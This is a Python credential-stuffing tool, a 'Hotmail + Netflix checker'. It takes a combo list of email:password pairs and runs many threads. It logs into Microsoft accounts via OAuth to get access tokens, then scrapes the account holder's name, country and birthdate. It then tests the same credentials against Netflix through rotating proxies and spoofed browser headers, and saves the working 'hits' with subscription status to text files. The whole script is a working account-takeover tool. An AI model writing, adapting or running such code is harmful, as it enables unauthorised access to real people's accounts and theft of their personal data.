import os, sys, io, time, json, uuid
import datetime, requests, threading, concurrent.futures
from colorama import Fore, Style, init
import random
import re
import urllib.parse
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
from threading import Lock, Semaphore
init(autoreset=True)


R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
WHITE = Fore.WHITE
HEADER = Fore.CYAN
HITS_COLOR = Fore.LIGHTGREEN_EX
BAD_COLOR = Fore.LIGHTRED_EX
RETRY_COLOR = Fore.LIGHTYELLOW_EX
INFO = Fore.CYAN
SUCCESS = Fore.GREEN
ERROR = Fore.RED
WARNING = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

# Global counters and locks
lock = threading.Lock()
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
netflix_hits = 0
netflix_checked = 0
checked_accounts = set()
rate_limit_semaphore = Semaphore(100)
proxies_list = []
proxy_index = 0
proxy_lock = Lock()

def get_next_proxy():
    """Get next proxy in rotation"""
    global proxy_index
    if not proxies_list:
        return None
    
    with proxy_lock:
        proxy = proxies_list[proxy_index]
        proxy_index = (proxy_index + 1) % len(proxies_list)
        return proxy

def load_proxies(file_path):
    """Load proxies from file in format ip:port:user:pass"""
    global proxies_list
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 4:
                        ip, port, user, password = parts
                        proxy_url = f"http://{user}:{password}@{ip}:{port}"
                        proxies_list.append({
                            'http': proxy_url,
                            'https': proxy_url
                        })
        
        if proxies_list:
            print(f"{SUCCESS}[✓] Loaded {len(proxies_list)} proxies")
            return True
        else:
            print(f"{WARNING}[!] No valid proxies found in file")
            return False
    except FileNotFoundError:
        print(f"{WARNING}[!] Proxy file not found. Netflix will be checked without proxy.")
        return False
    except Exception as e:
        print(f"{ERROR}[!] Error loading proxies: {e}")
        return False

class NetflixVMSubChecker:
    def __init__(self):
        self.session = requests.Session()
        self.base_headers = {
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-ch-ua-model': '""',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate'
        }
    
    def _random_string(self, length=32):
        import string
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def check_account(self, email: str, password: str, use_proxy=True) -> dict:
        """Check Netflix account with VM + Sub logic"""
        proxy = get_next_proxy() if use_proxy else None
        
        try:
            # Step 1: Get Netflix homepage
            success, auth_url, esn, esn_prefix, ui_version = self._get_homepage(proxy)
            
            if not success:
                return {'status': 'FAILED', 'message': 'Failed to load Netflix homepage'}
            
            # Step 2: Check if email is registered
            is_registered, message = self._check_email_registration(
                email, auth_url, esn, esn_prefix, ui_version, proxy
            )
            
            if not is_registered:
                return {'status': 'INVALID', 'message': message}
            
            # Step 3: Login and check subscription
            login_success, subscription_status, netflix_id = self._login_and_check_subscription(
                email, password, auth_url, esn, esn_prefix, ui_version, proxy
            )
            
            if not login_success:
                return {'status': 'INVALID', 'message': 'Invalid password'}
            
            # Determine result
            if subscription_status == "CURRENT_MEMBER":
                status = "HIT_SUBSCRIPTION"
                has_subscription = True
            elif subscription_status in ["NEVER_MEMBER", "FORMER_MEMBER"]:
                status = "HIT_NO_SUBSCRIPTION"
                has_subscription = False
            else:
                status = "HIT_UNKNOWN"
                has_subscription = False
            
            return {
                'status': status,
                'has_subscription': has_subscription,
                'subscription_status': subscription_status,
                'netflix_id': netflix_id,
                'esn': esn,
                'ui_version': ui_version
            }
            
        except Exception as e:
            return {'status': 'ERROR', 'message': f'Error: {str(e)}'}
    
    def _get_homepage(self, proxy=None) -> tuple:
        try:
            url = "https://www.netflix.com/"
            headers = {
                **self.base_headers,
                'Upgrade-Insecure-Requests': '1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.netflix.com/login'
            }
            
            response = self.session.get(url, headers=headers, proxies=proxy, timeout=20)
            
            if response.status_code != 200:
                return False, None, None, None, None
            
            html = response.text
            
            # Extract tokens
            auth_url_match = re.search(r'"authURL":"([^"]+)"', html)
            if not auth_url_match:
                return False, None, None, None, None
            auth_url = auth_url_match.group(1).encode().decode('unicode_escape')
            
            esn_match = re.search(r'"esn":"([^"]+)"', html)
            esn = esn_match.group(1) if esn_match else ""
            
            esn_prefix_match = re.search(r'"X-Netflix\.esnPrefix":"([^"]+)"', html)
            esn_prefix = esn_prefix_match.group(1) if esn_prefix_match else ""
            
            ui_version_match = re.search(r'"X-Netflix\.uiVersion":"([^"]+)"', html)
            ui_version = ui_version_match.group(1) if ui_version_match else ""
            
            return True, auth_url, esn, esn_prefix, ui_version
            
        except:
            return False, None, None, None, None
    
    def _check_email_registration(self, email: str, auth_url: str, esn: str, 
                                   esn_prefix: str, ui_version: str, proxy=None) -> tuple:
        try:
            email_encoded = urllib.parse.quote(email)
            auth_url_encoded = urllib.parse.quote(auth_url)
            
            body = (
                f"authURL={auth_url_encoded}"
                f"&tracingId={ui_version}"
                f"&tracingGroupId=www.netflix.com"
                f"&esn={esn}"
                f"&param=%7B%22flow%22%3A%22signupSimplicity%22%2C%22mode%22%3A%22welcome%22%2C%22action%22%3A%22saveAction%22%2C%22fields%22%3A%7B%22email%22%3A%7B%22value%22%3A%22{email_encoded}%22%7D%7D%7D"
            )
            
            url = "https://www.netflix.com/api/aui/pathEvaluator/web/%5E2.0.0"
            params = {
                'landingURL': '/',
                'landingOrigin': 'https://www.netflix.com',
                'inapp': 'false',
                'languages': 'en-US',
                'netflixClientPlatform': 'browser',
                'supportCategory': 'innovation',
                'method': 'call',
                'callPath': '["aui","moneyball","next"]',
                'falcor_server': '0.1.0'
            }
            
            headers = {
                **self.base_headers,
                'x-netflix.request.client.context': '{"appstate":"foreground"}',
                'x-netflix.osname': 'Windows',
                'x-netflix.browserversion': '130',
                'x-netflix.uiversion': ui_version,
                'x-netflix.browsername': 'Chrome',
                'x-netflix.osfullname': 'Windows 10',
                'x-netflix.nq.stack': 'prod',
                'x-netflix.request.routing': '{"path":"/nq/aui/endpoint/%5E1.0.0-web/pathEvaluator","control_tag":"auinqweb"}',
                'x-netflix.esnprefix': esn_prefix,
                'content-type': 'application/x-www-form-urlencoded',
                'x-netflix.client.request.name': 'ui/xhrUnclassified',
                'x-netflix.request.attempt': '1',
                'x-netflix.osversion': '10.0',
                'x-netflix.clienttype': 'akira',
                'x-netflix.request.id': self._random_string(32),
                'Accept': '*/*',
                'Origin': 'https://www.netflix.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.netflix.com/',
                'Content-Length': str(len(body))
            }
            
            response = self.session.post(url, params=params, headers=headers, 
                                        data=body, proxies=proxy, timeout=20)
            
            if '"code":"BadRequest"' in response.text:
                return False, "Email not registered"
            
            return True, "Email is registered"
            
        except:
            return False, "Error checking email"
    
    def _login_and_check_subscription(self, email: str, password: str, auth_url: str,
                                      esn: str, esn_prefix: str, ui_version: str, proxy=None) -> tuple:
        try:
            email_encoded = urllib.parse.quote(email)
            auth_url_encoded = urllib.parse.quote(auth_url)
            
            body = (
                f"allocations=%7B%2264593%22%3A2%2C%2265451%22%3A9%2C%2265452%22%3A3%2C%2265654%22%3A2%7D"
                f"&tracingId={ui_version}"
                f"&tracingGroupId=www.netflix.com"
                f"&esn={esn}"
                f"&authURL={auth_url_encoded}"
                f"&param=%7B%22flow%22%3A%22signupSimplicity%22%2C%22mode%22%3A%22passwordOnly%22%2C%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22password%22%3A%7B%22value%22%3A%22{urllib.parse.quote(password)}%22%7D%2C%22email%22%3A%7B%22value%22%3A%22{email_encoded}%22%7D%2C%22previousMode%22%3A%22%22%7D%7D"
            )
            
            url = "https://www.netflix.com/api/aui/pathEvaluator/web/%5E2.0.0"
            params = {
                'landingURL': '/signup/password',
                'landingOrigin': 'https://www.netflix.com',
                'inapp': 'false',
                'isConsumptionOnly': 'false',
                'logConsumptionOnly': 'false',
                'languages': 'en-US',
                'netflixClientPlatform': 'browser',
                'supportCategory': 'innovation',
                'method': 'call',
                'callPath': '["aui","moneyball","next"]',
                'falcor_server': '0.1.0'
            }
            
            headers = {
                **self.base_headers,
                'x-netflix.request.client.context': '{"appstate":"foreground"}',
                'x-netflix.osname': 'Windows',
                'x-netflix.browserversion': '130',
                'x-netflix.uiversion': ui_version,
                'x-netflix.browsername': 'Chrome',
                'x-netflix.osfullname': 'Windows 10',
                'x-netflix.nq.stack': 'prod',
                'x-netflix.request.routing': '{"path":"/nq/aui/endpoint/%5E1.0.0-web/pathEvaluator","control_tag":"auinqweb"}',
                'x-netflix.esnprefix': esn_prefix,
                'content-type': 'application/x-www-form-urlencoded',
                'x-netflix.client.request.name': 'ui/xhrUnclassified',
                'x-netflix.request.attempt': '1',
                'x-netflix.osversion': '10.0',
                'x-netflix.clienttype': 'akira',
                'x-netflix.request.id': self._random_string(32),
                'Accept': '*/*',
                'Origin': 'https://www.netflix.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.netflix.com/signup/password?locale=en-US',
                'Content-Length': str(len(body))
            }
            
            response = self.session.post(url, params=params, headers=headers,
                                        data=body, proxies=proxy, timeout=20)
            
            response_text = response.text
            
            # Get Netflix ID
            netflix_id = None
            if 'NetflixId' in self.session.cookies:
                netflix_id = self.session.cookies['NetflixId']
            
            # Check subscription status
            if '"value":"CURRENT_MEMBER"' in response_text:
                return True, "CURRENT_MEMBER", netflix_id
            elif 'value":"NEVER_MEMBER' in response_text:
                return True, "NEVER_MEMBER", netflix_id
            elif 'value":"FORMER_MEMBER"' in response_text:
                return True, "FORMER_MEMBER", netflix_id
            elif 'value":"NON_REGISTERED_MEMBER' in response_text:
                return False, "NON_REGISTERED_MEMBER", None
            
            return True, "UNKNOWN", netflix_id
            
        except:
            return False, "ERROR", None

def display_banner():
    banner = f"""
{G}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║      HOTMAIL + NETFLIX VM SUB CHECKER -  BY BARON SAPLAR     ║
║                                                                   ║
║                     ║
║                ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

def update_progress():
    """Clean progress update without newlines"""
    global hit, bad, retry, processed, total_combos, netflix_hits, netflix_checked
    
    with lock:
        progress_percent = min((processed / total_combos * 100), 100) if total_combos > 0 else 0
        
        # Clear line and update
        progress_line = (
            f"\r{WHITE}[{progress_percent:5.1f}%] "
            f"Checked: {processed}/{total_combos} | "
            f"{HITS_COLOR}Hotmail: {hit}{WHITE} | "
            f"{BAD_COLOR}Bad: {bad}{WHITE} | "
            f"{M}Netflix: {netflix_checked}{WHITE} | "
            f"{G}NFX Hits: {netflix_hits}{RESET}"
        )
        
        sys.stdout.write(progress_line)
        sys.stdout.flush()

def save_netflix_capture(email, password, hotmail_data, netflix_data):
    """Save combined capture"""
    global netflix_hits
    
    subscription_emoji = "🔥" if netflix_data.get('has_subscription') else "❌"
    subscription_text = "CURRENT MEMBER" if netflix_data.get('has_subscription') else netflix_data.get('subscription_status', 'N/A')
    
    capture = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                    HOTMAIL + NETFLIX CAPTURE                      ║
╚═══════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━ HOTMAIL ACCOUNT ━━━━━━━━━━━━━━━━━━━━━
Email : {email}
Password : {password}

Name : {hotmail_data.get('name', 'N/A')}
Country : {hotmail_data.get('country_flag', '')} {hotmail_data.get('country', 'N/A')}
Birthdate : {hotmail_data.get('birthdate', 'N/A')}

━━━━━━━━━━━━━━━━━━━━ NETFLIX STATUS ━━━━━━━━━━━━━━━━━━━━━
Status : {subscription_emoji} {subscription_text}
Has Subscription : {'YES 🔥' if netflix_data.get('has_subscription') else 'NO'}
Netflix ID : {netflix_data.get('netflix_id', 'N/A')}
ESN : {netflix_data.get('esn', 'N/A')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
    
    # Save to files
    if netflix_data.get('has_subscription'):
        filename = 'Netflix-Subscription-Hits.txt'
        with lock:
            netflix_hits += 1
    else:
        filename = 'Netflix-NoSubscription-Hits.txt'
    
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(capture)
    
    with open('Hotmail-Netflix-Combined-Hits.txt', 'a', encoding='utf-8') as f:
        f.write(capture)

def get_hotmail_capture(email, password, token, cid):
    """Get Hotmail data"""
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                               headers=headers, timeout=30).json()
        
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        
        try:
            import pycountry
            country_obj = pycountry.countries.lookup(country)
            country_flag = ''.join(chr(127397 + ord(c)) for c in country_obj.alpha_2)
        except:
            country_flag = '🏳'
        
        try:
            birthdate = "{:04d}-{:02d}-{:02d}".format(
                response["accounts"][0]["birthYear"],
                response["accounts"][0]["birthMonth"],
                response["accounts"][0]["birthDay"]
            )
        except:
            birthdate = "Unknown"
        
        return {
            'name': name,
            'country': country,
            'country_flag': country_flag,
            'birthdate': birthdate
        }
            
    except:
        return {
            'name': 'Unknown',
            'country': 'Unknown',
            'country_flag': '🏳',
            'birthdate': 'Unknown'
        }

def check_account(email, password):
    """Check Hotmail WITHOUT proxy"""
    try:
        session = requests.Session()
        
        # IDP Check
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}
        
        # OAuth
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        # Login
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            return {"status": "BAD"}
        
        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return {"status": "BAD"}
            
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        
        code = code_match.group(1)
        
        # Token
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                         data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        
        token_json = r4.json()
        access_token = token_json["access_token"]
        
        # CID
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        return {"status": "HIT", "token": access_token, "cid": cid}
        
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception as e:
        return {"status": "RETRY"}

def check_combo(email, password):
    global hit, bad, retry, processed, netflix_checked
    
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock:
            processed += 1
        update_progress()
        return
        
    checked_accounts.add(account_id)
    
    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        
        # Check Hotmail (no proxy)
        result = check_account(email, password)
        
        if result["status"] == "HIT":
            with lock:
                hit += 1
                processed += 1
            
            # Get Hotmail data
            hotmail_data = get_hotmail_capture(email, password, result["token"], result["cid"])
            
            # Print on new line for HIT
            print(f"\n{HITS_COLOR}[✓] Hotmail HIT: {email} - Checking Netflix...{RESET}")
            
            # Check Netflix WITH proxy
            netflix_checker = NetflixVMSubChecker()
            netflix_result = netflix_checker.check_account(email, password, use_proxy=True)
            
            with lock:
                netflix_checked += 1
            
            if netflix_result['status'] in ['HIT_SUBSCRIPTION', 'HIT_NO_SUBSCRIPTION', 'HIT_UNKNOWN']:
                save_netflix_capture(email, password, hotmail_data, netflix_result)
                
                if netflix_result.get('has_subscription'):
                    print(f"{G}[🔥] NETFLIX SUBSCRIPTION: {email}{RESET}")
                else:
                    print(f"{Y}[+] Netflix valid (no sub): {email}{RESET}")
            else:
                print(f"{R}[-] Netflix check failed: {email}{RESET}")
            
        elif result["status"] == "BAD":
            with lock:
                bad += 1
                processed += 1
        elif result["status"] == "RETRY":
            with lock:
                retry += 1
                processed += 1
        else:
            with lock:
                bad += 1
                processed += 1
        
        update_progress()

def main():
    global total_combos, processed
    
    display_banner()
    print(f"{G}[✔️] Combined Hotmail + Netflix VM Sub Checker{RESET}")
    print(f"{'─'*70}")
    
    file_path = input(f"{INFO}Combo File: {RESET}").strip()
    
    # Ask for proxy file
    use_proxy = input(f"{INFO}Use proxy for Netflix? (y/n): {RESET}").strip().lower()
    
    if use_proxy == 'y':
        proxy_file = input(f"{INFO}Proxy File (ip:port:user:pass): {RESET}").strip()
        if not load_proxies(proxy_file):
            print(f"{WARNING}[!] Continuing without proxies...{RESET}")
    else:
        print(f"{WARNING}[!] Netflix will be checked without proxy{RESET}")
    
    while True:
        try:
            num_threads = int(input(f"{INFO}Threads (20-100): {RESET}"))
            if 1 <= num_threads <= 500:
                break
            else:
                print(f"{ERROR}[!] Enter between 1-500{RESET}")
        except ValueError:
            print(f"{ERROR}[!] Enter valid number{RESET}")
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if ":" in line]
        total_combos = len(lines)
    except FileNotFoundError:
        print(f"{ERROR}[!] File not found: {file_path}{RESET}")
        exit(1)
    except Exception as e:
        print(f"{ERROR}[!] Error: {e}{RESET}")
        exit(1)
    
    print(f"{'─'*70}")
    print(f"{INFO}[*] Total combos: {total_combos}{RESET}")
    print(f"{INFO}[*] Threads: {num_threads}{RESET}")
    print(f"{INFO}[*] Starting...{RESET}\n")
    
    update_progress()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for line in lines:
            try:
                email, password = line.split(":", 1)
                futures.append(executor.submit(check_combo, email.strip(), password.strip()))
            except ValueError:
                continue
        
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception:
                with lock:
                    retry += 1
                    processed += 1
                update_progress()
    
    # Final stats
    print(f"\n\n{SUCCESS}╔═══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{SUCCESS}║                        CHECKING COMPLETE                          ║{RESET}")
    print(f"{SUCCESS}╚═══════════════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"{INFO}Final Statistics:{RESET}")
    print(f"{HITS_COLOR}  Hotmail Hits: {hit}{RESET}")
    print(f"{BAD_COLOR}  Bad: {bad}{RESET}")
    print(f"{RETRY_COLOR}  Retries: {retry}{RESET}")
    print(f"{M}  Netflix Checked: {netflix_checked}{RESET}")
    print(f"{G}  Netflix Subscription Hits: {netflix_hits}{RESET}")
    
    print(f"\n{INFO}Output Files:{RESET}")
    if os.path.exists('Netflix-Subscription-Hits.txt'):
        print(f"{G}  ✓ Netflix-Subscription-Hits.txt{RESET}")
    if os.path.exists('Netflix-NoSubscription-Hits.txt'):
        print(f"{Y}  ✓ Netflix-NoSubscription-Hits.txt{RESET}")
    if os.path.exists('Hotmail-Netflix-Combined-Hits.txt'):
        print(f"{C}  ✓ Hotmail-Netflix-Combined-Hits.txt{RESET}")

if __name__ == "__main__":
    main()
